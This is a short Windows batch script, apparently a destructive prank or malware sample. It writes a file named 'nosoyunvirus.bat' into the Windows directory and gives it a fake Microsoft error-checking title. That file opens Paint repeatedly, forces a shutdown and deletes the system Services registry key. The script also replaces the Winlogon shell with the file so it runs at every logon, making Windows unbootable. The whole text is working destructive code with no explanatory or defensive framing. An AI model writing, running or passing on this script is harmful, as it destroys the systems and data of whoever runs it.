@echo off
echo @echo off >>%windir%/nosoyunvirus.bat
echo title Sistema de comprobacion de errores de Microsoft >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo start mspaint.exe >>%windir%/nosoyunvirus.bat
echo shutdown -s -f -t 05 -c >>%windir%/nosoyunvirus.bat
echo reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services >>%windir%/nosoyunvirus.bat
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ /v shell /d %windir%/nosoyunvirus.bat